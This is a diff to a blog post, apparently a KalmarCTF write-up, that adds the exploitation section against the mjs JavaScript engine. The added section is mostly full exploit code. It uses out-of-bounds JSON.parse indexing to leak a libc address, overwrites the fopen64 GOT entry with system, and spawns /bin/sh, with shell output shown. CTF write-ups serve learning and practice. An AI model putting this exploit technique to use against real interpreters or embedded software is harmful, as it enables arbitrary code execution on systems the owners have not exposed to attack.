@@ -1,7 +1,7 @@
 ---
 title: "Hacking Toddler Js Engine"
 date: 2023-03-15T18:24:55+07:00
-draft: true
+draft: false
 iscjklanguage: false
 isarchived: false
 categories: ["CTF"]
@@ -233,5 +233,184 @@ pwndbg>
 ~~~
 0x2c018 is offset from the base address. 
 
+Lets validate by leaking those address.
+~~~javascript
+let base = -0xfe40;
+let free = 0x2c018;
+JSON.parse[base + free];
+~~~
+
+![](https://user-images.githubusercontent.com/11147011/225487564-7d182ca4-ea13-44ab-8a91-0d441c6e2a1a.png)
+
+If we increase the address, we got leak from some adress inside libc. When we convert it to hex, you will saw the pattern of libc address.
+~~~python
+Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(96)
+'0x60'
+>>> hex(84)
+'0x54'
+>>> hex(202)
+'0xca'
+>>> hex(247)
+'0xf7'
+~~~
+![](https://user-images.githubusercontent.com/11147011/225488274-fb7c67f3-b9a6-4a60-87ce-669a13866313.png)
+
+We leaking the free libc address byte by byte.
+
+## Exploitation
+
+Since we got everthing we need to exploit the binary, we can start to exploit it. 
+
+### Leak libc address
+~~~javascript
+let base = -0xfe40;
+let free_got = 0x2c018;
+let free_addr = "0x";
+let hexChars = "0123456789abcdef";
+
+function intToHex(num) {
+  let hex = "";
+  while (num > 0) {
+    let remainder = num % 16;
+    hex = hexChars[remainder] + hex;
+    num = (num - remainder) / 16;
+  }
+
+  if (hex.at(1) === undefined){
+    hex = "0" + hex;
+  }
+  return hex;
+}
+for (let i = 5; i >= 0; i--) {
+  free_addr += intToHex(JSON.parse[base+free_got+i])
+}
+print("free_addr: " , free_addr);
+~~~
+
+~~~bash
+pwndbg> r do.js
+Starting program: /home/syahrul/CTF/KalmarCTF/pwn/browser/build/mjs_compiled do.js
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+free_addr:  0x7ffff7ca5460 
+undefined
+[Inferior 1 (process 6668) exited normally]
+~~~
+
+### Overwrite fopen64@GLIBC_2.2.5
+
+Why we need to overwrite fopen64@GLIBC_2.2.5? 
+Argument from the fopen64 function is a pointer to a string that contains the name of the file to be opened. It used by load() function to load the file. So if we change the fopen64@GLIBC_2.2.5 to system@GLIBC_2.2.5, we can execute any command we want. 
+![](https://user-images.githubusercontent.com/11147011/225491024-189a615c-6ebd-488f-9da2-bbe659f245bb.png)
+
+### Final Exploit
+~~~javascript
+let base = -0xfe40;
+let free_got = 0x2c018;
+let free_addr = "0x";
+let hexChars = "0123456789abcdef";
+let fopen64_got = 0x2c0f0;
+
+function intToHex(num) {
+  let hex = "";
+
+  while (num > 0) {
+    let remainder = num % 16;
+    hex = hexChars[remainder] + hex;
+    num = (num - remainder) / 16;
+  }
+
+  if (hex.at(1) === undefined){
+    hex = "0" + hex;
+  }
+  return hex;
+}
+
+for (let i = 5; i >= 0; i--) {
+  free_addr += intToHex(JSON.parse[base+free_got+i])
+}
+
+function stringToInt(str) {
+  let num = 0;
+
+  for (let i = 2; i < 14; i++) {
+    let char = str.at(i);
+    let charValue = hexChars.indexOf(chr(char));
+    num = num * 16 + charValue;
+  }
+  return num;
+}
+
+function toHex(num){
+  let hex = "";
+
+  while (num > 0) {
+    let remainder = num % 16;
+    hex = hexChars[remainder] + hex;
+    num = (num - remainder) / 16;
+  }
+
+  if (hex.at(1) === undefined){
+    hex = "0" + hex;
+  }
+  return hex;
+};
 
 
+function hexToByte(hexStr) {
+  let byte = 0;
+  for (let i = 0; i < hexStr.length; i++) {
+    let digit = hexStr.at(i);
+    if (digit >= 48 && digit <= 57) { 
+      digit -= 48;
+    } else if (digit >= 65 && digit <= 70) {  
+      digit -= 55;
+    } else if (digit >= 97 && digit <= 102) {  
+      digit -= 87;
+    } else {
+      die("Invalid hexadecimal character");
+    }
+    byte = byte * 16 + digit;
+  }
+  return byte;
+}
+
+
+
+function hack(hexStr) {
+  let iter = 0;
+  for (let i = 0; i < hexStr.length; i += 2) {
+    let hexPair = hexStr.slice(i, i + 2);
+    JSON.parse[base+fopen64_got-iter + 5] = hexToByte(hexPair);
+    iter++;
+  }
+};
+
+
+let libc = stringToInt(free_addr) - 676960;
+print("free_addr: " , free_addr);
+print("libc: " , toHex(libc));
+print("system: " , toHex(libc+0x50d60));
+let rip = libc + 0x50d60;
+hack(toHex(rip));
+
+load("/bin/sh")
+
+~~~
+~~~bash
+➜  build git:(master) ✗ ./mjs_compiled do.js
+free_addr:  0x7f44060a5460 
+libc:  7f4406000000 
+system:  7f4406050d60 
+$ ls
+1.js  do.js  dump  exploit.py  hack.js	leak.js  mjs_compiled  plt  poc1.js  poc2.js  poc3.js  poc.js  pwn.js  writeup.js
+$ ud
+/bin/sh: 2: ud: not found
+$ id
+uid=1000(syahrul) gid=1000(syahrul) groups=1000(syahrul),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare),140(libvirt),999(docker)
+$ pwd
+/home/syahrul/CTF/KalmarCTF/pwn/browser/build
+$ 
+~~~
